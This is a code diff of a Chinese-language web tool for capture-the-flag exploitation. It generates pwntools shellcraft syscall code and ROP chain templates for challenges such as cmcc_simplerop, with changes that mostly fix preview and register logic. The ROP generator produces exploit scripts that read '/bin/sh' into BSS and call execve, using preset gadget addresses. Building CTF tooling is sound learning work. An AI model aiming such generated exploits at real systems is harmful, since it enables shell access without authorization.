-    warn.textContent=archText("文件名参数是指针，不能把字符串直接填进 syscall，更不是长度。下面生成的代码会自动先 pushstr 上面填的字符串、再传 'rsp'，复制和加到链里都带这行；想换文件名改上面那个框。把上面框留空 = 这个参数传 0（init_module 的参数串、kexec_file_load 的命令行这类本来就常为空）。把文件名参数改成别的寄存器时，pushstr 那行会自动去掉（那种情况要自己保证字符串已经在那个地址）。");
+    warn.textContent=archText("文件名参数是指针，不能把字符串直接填进 syscall，更不是长度。下面生成的代码会自动先 pushstr 上面填的字符串、再传 'rsp'，复制和加到链里都带这行；想换文件名改上面那个框。把上面框留空 = 这个参数传 0（参数手动改成别的寄存器时按那个寄存器传；init_module 的参数串、kexec_file_load 的命令行这类本来就常为空）。把文件名参数改成别的寄存器时，pushstr 那行会自动去掉（那种情况要自己保证字符串已经在那个地址）。");
     warn.classList.add("show");
   } else warn.classList.remove("show");
   if(cur.name==="socketcall" && arch==="i386"){
@@ -1395,7 +1404,7 @@ function select(sys){
     $("strInput").value=mm.def[0]||""; $("strInput2").value=mm.def[1]||""; if(mm.idx.length>=3) $("strInput3").value=mm.def[2]||"";
     $("strLabel").textContent=archText("第一个字符串 · "+argName(sys.args[mm.idx[0]])+"（生成时自动 pushstr 压栈，这个参数传 'rsp'）");
     $("strLabel2").textContent=archText("第二个字符串 · "+argName(sys.args[mm.idx[1]])+"（先 pushstr 再 mov "+(regs2[1]?regs2[1].replace(/'/g,""):"r13")+", rsp 保存，这个参数传 "+(regs2[1]||"'r13'")+"）");
-    if(mm.idx.length>=3) $("strLabel3").textContent=archText("第三个字符串 · "+argName(sys.args[mm.idx[2]])+"（先 pushstr 再 mov "+(regs2[2]?regs2[2].replace(/'/g,""):"r14")+", rsp 保存，这个参数传 "+(regs2[2]||"'r14'")+"）"+(arch==="i386"&&sys.name==="mount"?"；i386 下这是暂存寄存器，生成时走手动 mov 顺序":""));
+    if(mm.idx.length>=3) $("strLabel3").textContent=archText("第三个字符串 · "+argName(sys.args[mm.idx[2]])+"（先 pushstr 再 mov "+(regs2[2]?regs2[2].replace(/'/g,""):"r14")+", rsp 保存，这个参数传 "+(regs2[2]||"'r14'")+"）"+(arch==="i386"&&sys.name==="mount"?"；i386 下这是暂存寄存器，生成时走手动 mov 顺序（dir 留空时 type 改存 ebp，以生成代码为准）":""));
   }
   else if(STR2[sys.name]){sb.style.display="block";sb2.style.display="block";sb3.style.display="none";var dd=STR2DEF[sys.name]||["flag","flag2"];$("strInput").value=dd[0];$("strInput2").value=dd[1];
     $("strLabel").textContent=archText("文件名字符串（生成时自动 pushstr 压栈，文件名参数传 'rsp'）");
@@ -1426,7 +1435,7 @@ function select(sys){
         +'<div class="ls-row">文件是更早打开的：<button data-autofill="r12">填保存的寄存器</button><span>当时如果先 mov 保存过（例：mov '+(arch==="i386"?"esi":"r12")+', '+axReg()+'），就填那个寄存器；没保存过又跑了别的调用，这个 fd 已经找不回来了，要在链里那一步后面补一步保存</span></div></div>';
     } else if(h[0]==="vec"){
       autoSrc='<div class="len-src"><p class="ls-title">自动化搭法：先在栈上搭好这张小表格，vec 再填表格地址</p>'
-        +'<div class="ls-row"><span>表格每行 16 字节：第 1 格 = 数据的地址，第 2 格 = 数据有多少字节。内核照着表格去读写。直接把数据地址填给 vec 是错的——内核会把你的数据前 16 字节当成表格来读。</span></div>'
+        +'<div class="ls-row"><span>表格每行 '+(arch==="i386"?"8":"16")+' 字节：第 1 格 = 数据的地址，第 2 格 = 数据有多少字节。内核照着表格去读写。直接把数据地址填给 vec 是错的——内核会把你的数据前 '+(arch==="i386"?"8":"16")+' 字节当成表格来读。</span></div>'
         +'<pre>; 例：数据在 '+axReg()+' 里（上一步 mmap 返回的地址），长度 0x100 字节\npush 0x100   ; 先压第 2 格：长度\npush '+axReg()+'     ; 再压第 1 格：数据地址\n; 压完 '+spReg()+' 正好指向这张表格</pre>'
         +'<div class="ls-row"><button data-autofill="rsp">按这个搭法：vec 填 \''+spReg()+'\'</button><span>上面两行 push 写在 syscall 那行前面；数据不在 '+axReg()+' 里，就把第二行 push 的换成你的数据地址，长度按你的数据改</span></div></div>';
     } else if(h[0]==="cnt"){
@@ -1455,7 +1464,7 @@ function select(sys){
     var multi2=STR_MULTI[sys.name];
     if(multi2){
       var rr=strMultiRegs(sys);
-      // 每个字符串参数框默认填保存寄存器（第 3 个可选字符串的默认值是空串时也照填：字符串框空着时生成会把参数强制成 0，
+      // 每个字符串参数框默认填保存寄存器（第 3 个可选字符串的默认值是空串时也照填：字符串框空着、参数还是自动值时生成传 0，手动改过的寄存器保留，
       // 不影响；用户一旦在字符串框里填了内容，参数框已经是保存寄存器，pushstr 不会丢。之前按默认值跳过，
       // 导致 request_key 的 _callout_info 这类可选字符串填了内容却丢 pushstr。）
       multi2.idx.forEach(function(ix,k){ if(inputs[ix] && !inputs[ix].value && rr[k]) inputs[ix].value=dispVal(rr[k]); });
@@ -1593,13 +1602,70 @@ function render(){
   } else ww.classList.remove("show");
   if($("asmPreview").style.display!=="none") updateAsmPreview();
 }
+// 汇编预览必须和生成的代码用同一套参数：buildFullCode 会把「字符串框留空」的参数改传 0、
+// 把「框填了但参数还是空/0」的参数补成 'rsp'/保存寄存器。预览若直接用参数框的原始值，
+// 就会残留代码里根本没有的 mov（如 rename 第二个框留空：代码第二参数传 0，预览却还写 mov rsi, r13）。
+// 这里按 buildFullCode 相同的规则算实际生效的参数，只给预览和顺序说明用，不改生成逻辑。
+function effectiveVals(sys, vals){
+  var out=vals.slice();
+  var multi=STR_MULTI[sys.name];
+  if(multi){
+    var strs=[($("strInput").value||"").trim(),($("strInput2").value||"").trim(),($("strInput3")?($("strInput3").value||"").trim():"")];
+    for(var k=0;k<multi.idx.length;k++){
+      var canon=multiCanon(sys,k);
+      if(!strs[k]){ // 与 buildFullCode 同口径：只有自动值（空 / 0 / 保存寄存器）才算 0，用户手动改的寄存器保留，预览不能把它显示成 0
+        var rawV2=vals[multi.idx[k]];
+        if(rawV2==="" || fmtVal(rawV2)==="0" || (canon && fmtVal(rawV2)==="'"+physOf(canon)+"'")) out[multi.idx[k]]="0";
+      }
+      else if(canon && (fmtVal(vals[multi.idx[k]])==="'"+physOf(canon)+"'" || vals[multi.idx[k]]==="" || fmtVal(vals[multi.idx[k]])==="0")) out[multi.idx[k]]="'"+physOf(canon)+"'";
+    }
+    // i386 mount 走手动 mov 顺序时例外：手动路径里 dev/dir/type 的最终值只由 use 决定（mountManual32 不读这三个参数框），
+    // 预览/顺序说明要跟生成代码一致。按 buildFullCode 的同一套规则重算 use、同一条件判定是否走手动路径：
+    // 走了手动路径时，框留空的参数就是传 0——哪怕参数框被手动改成了别的寄存器，生成代码也传 0，说明不能还按那个寄存器写；
+    // 框填了且参数自动时 dev=esp、dir=ebp；type 的暂存 dir 存了用 edi、dir 没存直接用 ebp（见 mountManual32 的 temp2）。
+    // 没走手动路径时不动（dir 填了但参数被改成别的寄存器等情况仍走普通生成，F3 口径保留手动值）。
+    if(arch==="i386" && sys.name==="mount"){
+      var useM=[];
+      for(var k2=0;k2<multi.idx.length;k2++){
+        var cn2=multiCanon(sys,k2);
+        useM[k2]=!!strs[k2] && !!cn2 && (fmtVal(vals[multi.idx[k2]])==="'"+physOf(cn2)+"'" || vals[multi.idx[k2]]==="" || fmtVal(vals[multi.idx[k2]])==="0");
+      }
+      if(useM[2] && (!strs[1] || useM[1]) && (useM[0] || !strs[0])){
+        out[multi.idx[0]]= useM[0] ? "'"+spReg()+"'" : "0";
+        out[multi.idx[1]]= useM[1] ? "'ebp'" : "0";
+        out[multi.idx[2]]= useM[1] ? "'edi'" : "'ebp'";
+      }
+    }
+    return out;
+  }
+  var two=STR2[sys.name];
+  if(two){
+    var s1=($("strInput").value||"").trim(), s2=($("strInput2").value||"").trim();
+    var savePhys=physOf(str2Canon(sys));
+    if(s1 && (fmtVal(vals[two.a])==="'"+spReg()+"'" || vals[two.a]==="" || fmtVal(vals[two.a])==="0")) out[two.a]="'"+spReg()+"'";
+    if(s2 && (fmtVal(vals[two.b])==="'"+savePhys+"'" || vals[two.b]==="" || fmtVal(vals[two.b])==="0")) out[two.b]="'"+savePhys+"'";
+    if(!s1 && fmtVal(vals[two.a])==="'"+spReg()+"'") out[two.a]="0";
+    if(!s2 && fmtVal(vals[two.b])==="'"+savePhys+"'") out[two.b]="0";
+    return out;
+  }
+  var idx=STRARG[sys.name];
+  if(idx!==undefined){
+    var sv=($("strInput").value||"").trim();
+    if(!sv){ if(fmtVal(vals[idx])==="'"+spReg()+"'") out[idx]="0"; }
+    else if(fmtVal(vals[idx])==="'"+spReg()+"'" || vals[idx]==="" || fmtVal(vals[idx])==="0") out[idx]="'"+spReg()+"'";
+  }
+  return out;
+}
 function asmPreviewText(sys, vals){
   var lines=[];
   var full=buildFullCode(sys, vals);
-  if(full.indexOf("syscall(")<0){ // 手动 mov 顺序生成（i386 mount，没有空闲保存寄存器时的兜底）：原样展示，不套 syscall 的寄存器说明
+  if(!/(^|\n)sc \+= shellcraft\.(amd64|i386)\.linux\.syscall\(/.test(full)){ // 手动 mov 顺序生成（i386 mount，没有空闲保存寄存器时的兜底）：原样展示，不套 syscall 的寄存器说明。按生成语句本身判断，不用 "syscall(" 子串——字符串内容（如文件名）里出现 syscall( 会让子串判断把手动代码误判成普通路径
     var ml=full.split("\n").map(function(l){return "; "+l.replace("sc += ","");});
     ml.push("");
-    ml.push("; 这条不走 shellcraft.syscall：寄存器搬运顺序写死在上面——type 先暂存 edi，搬进 edx 之后 edi 才轮到放 data；dir 存 ebp（mount 用不到）。");
+    var dirEmpty=!($("strInput2").value||"").trim();
+    ml.push(dirEmpty
+      ? "; 这条不走 shellcraft.syscall：寄存器搬运顺序写死在上面——dir 留空传 0，type 直接存 ebp、再搬进 edx，edi 留给 data。"
+      : "; 这条不走 shellcraft.syscall：寄存器搬运顺序写死在上面——type 先暂存 edi，搬进 edx 之后 edi 才轮到放 data；dir 存 ebp（mount 用不到）。");
     return ml.join("\n");
   }
   if(full.indexOf("pushstr")>=0){
@@ -1609,7 +1675,7 @@ function asmPreviewText(sys, vals){
     });
   }
   var movCount=0, skipped=0;
-  vals.forEach(function(v,i){
+  effectiveVals(sys, vals).forEach(function(v,i){
     var av=asmVal(v);
     if(av===REGS[i]){ skipped++; lines.push("; "+REGS[i]+" 已是 "+av+"（setregs 会跳过这一步，不用再 mov）"); }
     else { movCount++; lines.push("mov "+REGS[i]+", "+av); }
@@ -1651,7 +1717,7 @@ $("strInput2").addEventListener("input",render);
 $("strInput3").addEventListener("input",render);
 $("asmBtn").addEventListener("click",function(){
   var n=$("asmNote"), p=$("asmPreview"); if(!cur)return;
-  var lines=currentVals().map(function(v,i){return REGS[i]+" ← "+(asmVal(v));});
+  var lines=effectiveVals(cur, currentVals()).map(function(v,i){return REGS[i]+" ← "+(asmVal(v));});
   n.innerHTML="pwntools 生成汇编的顺序：先把参数搬进寄存器（"+(lines.join("，")||"无参数")+"），<b>最后</b>才把 "+axReg()+" 改成调用号 "+cur.nr+"，所以参数里用 '"+axReg()+"' 不会被覆盖。执行完之后："+raxAfter(cur.name);
   var show=n.style.display==="none";
   n.style.display=show?"block":"none";
@@ -1667,6 +1733,8 @@ function isSaveStep(s){ return s && s.isSave; }
 // 以及后续步骤生成代码里出现过的候选寄存器（清空参数框时 buildFullCode 会自动生成 mov r13, rsp 之类的代码，
 // 只扫参数值看不到，挑中它保存的值会被那句代码盖掉）。
 // amd64 从 r12、r13、r14、r15 里挑第一个未用的，i386 从 esi/edi/ebp 里挑。都占满时回退到第一个候选。
+// 扫生成代码时先抹掉 pushstr('…') 里的字符串内容：那是文件名之类的数据，文件名正好叫 r13 不算占用这个寄存器，
+// 不抹掉会误判（把还能用的保存寄存器白白跳过）。
 function pickSaveReg(afterIdx){
   var cands=arch==="i386" ? ["esi","edi","ebp"] : ["r12","r13","r14","r15"];
   var used={};
@@ -1675,7 +1743,7 @@ function pickSaveReg(afterIdx){
   });
   for(var k=afterIdx+1;k<chain.length;k++){
     var s=chain[k]; if(!s) continue;
-    if(s.code){ var codeStr=String(s.code); cands.forEach(function(c){ if(new RegExp("\\b"+c+"\\b").test(codeStr)) used[c]=1; }); }
+    if(s.code){ var codeStr=String(s.code).replace(/pushstr\('(?:\\.|[^'\\])*'\)/g,"pushstr('')"); cands.forEach(function(c){ if(new RegExp("\\b"+c+"\\b").test(codeStr)) used[c]=1; }); }
     if(isSaveStep(s)||!s.vals) continue;
     s.vals.forEach(function(v){ var r=(v||"").trim().replace(/^'|'$/g,""); if(r) used[r]=1; });
   }
@@ -1835,7 +1903,7 @@ $("wlInput").addEventListener("input",parseWL);
 function wlPresetNames(key){
   if(key==="mmap") return arch==="i386" ? ["open","mmap2","write"] : ["open","mmap","write"];
   if(key==="orw") return ["open","read","write"];
-  if(key==="openat") return arch==="i386" ? ["read","write","open","openat","fstatat64"] : ["read","write","open","openat","newfstatat"];
+  if(key==="openat") return arch==="i386" ? ["read","write","openat","fstatat64"] : ["read","write","openat","newfstatat"];
   return [];
 }
 function refreshWlButtons(){
@@ -1956,7 +2024,7 @@ function ropSetPrim(p){
 function ropV(id){ var el=$(id); return el ? el.value.trim() : ""; }
 function ropSet(id,v){ var el=$(id); if(el) el.value=v; }
 var ROP_COND={
- "41":"条件：i386 静态；有 pop eax、pop edx/ecx/ebx、int 0x80。代表：cmcc_simplerop。思路：链里先 read(0, bss, len) 把 /bin/sh 读进 BSS，再 execve(bss, 0, 0)。",
+ "41":"条件：i386 静态；有 pop eax、pop edx/ecx/ebx、int 0x80。代表：cmcc_simplerop。思路：链里先 read(0, bss, len) 把 /bin/sh 读进 BSS，再 execve(bss, 0, 0)。示例 gadget 地址（cmcc_simplerop）未验证，按当前目标重测后填。",
  "42":"条件：i386 静态；有 pop eax、pop edx/ecx/ebx、mov [edx],eax、int 0x80；bss_addr 可写。代表：get_started_3dsctf_2016。思路：用 mov 写 gadget 把字符串按 4 字节分块写进 BSS，再 execve。示例 gadget 地址由用户提供、未验证。",
  "43":"条件：amd64；有 pop rax/rdi/rsi/rdx + syscall；目标里已有 /bin/sh 字符串。代表：静态 amd64 题、smallest 变体。默认全 0 是骨架占位，按当前目标重测后填。",
  "41a":"条件：amd64；有 pop rax/rdi/rsi/rdx + syscall；可写 BSS。思路：4.1 的 amd64 版——先 read(0, bss, len) 把 /bin/sh 读进 BSS，再 execve(bss, 0, 0)。默认全 0 是骨架占位，按当前目标重测后填。",
@@ -1979,12 +2047,13 @@ function ropGen(){
     var offN=parseNum(off), total41=(offN!==null ? offN : 0)+vals41.length*4;
     lines=[
       "# 4.1 i386 int 0x80：read → BSS → execve（cmcc_simplerop 型）",
+      "# 示例 gadget 地址（cmcc_simplerop）未验证，按当前目标重测后填",
       "from pwn import *",
       "import time",
       "context.arch = 'i386'",
       "io = process('./prog')  # TODO: 改成你的目标",
       "",
-      "offset_to_ret = "+off+"          # 输入起点 → saved RIP 的填充数",
+      "offset_to_ret = "+off+"          # 输入起点 → saved EIP 的填充数",
       "pop_eax_addr = "+pe+"      # pop eax; ret，把系统调用号放进 eax",
       "pop3_addr = "+p3+"         # pop edx; pop ecx; pop ebx; ret，一次设 3 个参数",
       "int80_addr = "+i8+"        # int 0x80; ret，进内核",
@@ -2026,7 +2095,7 @@ function ropGen(){
       "context.arch = 'i386'",
       "io = process('./prog')  # TODO: 改成你的目标",
       "",
-      "offset_to_ret = "+off+"            # 输入起点 → saved RIP 的填充数",
+      "offset_to_ret = "+off+"            # 输入起点 → saved EIP 的填充数",
       "binsh_addr = "+bs+"       # 写入字符串的可写 BSS 地址",
       "pop_eax_addr = "+pe2+"     # pop eax; ret",
       "pop3_addr = "+p32+"        # pop edx; pop ecx; pop ebx; ret",
@@ -2196,7 +2265,7 @@ $("ropPrimUnknown").addEventListener("click",function(){ropSetPrim("unknown");})
 document.querySelectorAll(".rop-input").forEach(function(inp){ inp.addEventListener("input", ropGen); });
 $("ropPreset41").addEventListener("click",function(){
   ropSet("ropOffset","0x20"); ropSet("rop41PopEax","0x80bae06"); ropSet("rop41Pop3","0x806e850"); ropSet("rop41Int80","0x806eef0"); ropSet("rop41Bss","0x80eaf80"); ropSet("rop41Len","0x100");
-  ropSetTpl("41"); toast("已填入 4.1 示例参数（cmcc_simplerop）");
+  ropSetTpl("41"); toast("已填入 4.1 示例参数（cmcc_simplerop；示例地址未验证）");
 });
 $("ropPreset42").addEventListener("click",function(){
   ropSet("ropOffset","56"); ropSet("rop42Binsh","0x080eb050"); ropSet("rop42PopEax","0x080b91e6"); ropSet("rop42Pop3","0x0806fc30"); ropSet("rop42Mov","0x080557ab"); ropSet("rop42Int80","0x0806d7e5");
